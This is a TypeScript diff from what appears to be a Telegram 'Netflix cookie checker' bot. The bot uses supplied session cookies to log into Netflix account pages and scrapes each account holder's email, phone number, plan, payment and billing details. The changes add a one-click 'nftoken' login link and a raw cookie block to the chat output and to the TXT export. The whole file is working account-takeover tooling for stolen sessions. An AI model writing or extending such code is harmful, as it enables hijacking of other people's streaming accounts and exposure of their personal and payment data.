@@ -30,9 +30,23 @@ function generateNfToken(netflixId: string): string {
 }
 
 // Extract from html using Regex helper
+function unescapeString(str: string): string {
+  if (!str) return 'Unknown';
+  try { return JSON.parse(`"${str}"`); } 
+  catch(e) { 
+    return str.replace(/\\u([0-9a-fA-F]{4})/g, (m, c) => String.fromCharCode(parseInt(c, 16)))
+              .replace(/\\x([0-9a-fA-F]{2})/g, (m, c) => String.fromCharCode(parseInt(c, 16)));
+  }
+}
+
 function extractGroup(html: string, regex: RegExp, fallback = 'Unknown'): string {
   const match = html.match(regex);
-  return match && match[1] ? match[1].trim() : fallback;
+  if (match && match[1]) {
+    const val = match[1].trim();
+    if (val === 'null' || val === '') return fallback;
+    return unescapeString(val);
+  }
+  return fallback;
 }
 
 // Scrape Netflix Account Pages
@@ -50,7 +64,7 @@ async function scrapeAccountDetails(cookie: ParsedCookie, fetchOptions: any) {
     }
     cookie.membershipStatus = accHtml.includes('CURRENT_MEMBER') || accHtml.includes('membershipStatus":"CURRENT_MEMBER') ? 'CURRENT_MEMBER' : 'Expired/Unknown';
 
-    // 2. Fetch membership page (if available, often embedded in react state)
+    // 2. Fetch membership page
     const memRes = await fetch('https://www.netflix.com/account/membership', fetchOptions);
     const memHtml = await memRes.text();
     cookie.plan = extractGroup(memHtml, /"planName":"([^"]+)"/, cookie.plan || 'Unknown');
@@ -66,6 +80,8 @@ async function scrapeAccountDetails(cookie: ParsedCookie, fetchOptions: any) {
     const profilesMatch = profHtml.match(/"profiles":\[(.*?)\]/);
     if (profilesMatch) {
        cookie.profilesCount = (profilesMatch[1].match(/"guid"/g) || []).length;
+    } else {
+       cookie.profilesCount = accHtml.match(/"guid"/g)?.length || 1;
     }
 
     // 4. Payment Info
@@ -147,6 +163,7 @@ function escapeMarkdown(text: string): string {
 function formatResult(result: { valid: boolean; details: ParsedCookie; error?: string }): string {
   const d = result.details;
   if (result.valid) {
+    const rawC = d.rawCookie || `NetflixId=${d.netflixId}`;
     return `*═══════════════════════════════════════════════════════════════*
 🎉 *Netflix Valid Cookie \\- Yash*
 *═══════════════════════════════════════════════════════════════*
@@ -163,10 +180,11 @@ function formatResult(result: { valid: boolean; details: ParsedCookie; error?: s
 📱 Phone Number        : ${escapeMarkdown(d.phoneNumber || 'Unknown')}
 👥 Profiles Count      : ${escapeMarkdown(d.profilesCount?.toString() || 'Unknown')}
 📆 Next Billing        : ${escapeMarkdown(d.nextBilling || 'Unknown')}
-
-nf token;
-\`${escapeMarkdown(d.nftoken || '')}\`
-*═══════════════════════════════════════════════════════════════*`;
+*═══════════════════════════════════════════════════════════════*
+🔗 NFToken link        : https://www\\.netflix\\.com/browse?nftoken\\=${escapeMarkdown(d.nftoken || '')}
+*═══════════════════════════════════════════════════════════════*
+ cookies block:
+\`${escapeMarkdown(rawC)}\``;
   } else {
     return `❌ *INVALID\\/EXPIRED*
 📧 Email: ${escapeMarkdown(d.email || 'Unknown')}
@@ -176,6 +194,7 @@ nf token;
 
 // Format exactly for the TXT export file (no markdown escapes needed)
 function formatExportResult(d: ParsedCookie): string {
+    const rawC = d.rawCookie || `NetflixId=${d.netflixId}`;
     return `═══════════════════════════════════════════════════════════════
 🎉 Netflix Valid Cookie - Yash
 ═══════════════════════════════════════════════════════════════
@@ -192,10 +211,13 @@ function formatExportResult(d: ParsedCookie): string {
 📱 Phone Number        : ${d.phoneNumber || 'Unknown'}
 👥 Profiles Count      : ${d.profilesCount || 'Unknown'}
 📆 Next Billing        : ${d.nextBilling || 'Unknown'}
+═══════════════════════════════════════════════════════════════
+🔗 NFToken link        : https://www.netflix.com/browse?nftoken=${d.nftoken || ''}
+═══════════════════════════════════════════════════════════════
+ cookies block:
+${rawC}
 
-nf token;
-${d.nftoken || ''}
-═══════════════════════════════════════════════════════════════`;
+`;
 }
 
 // Get main keyboard
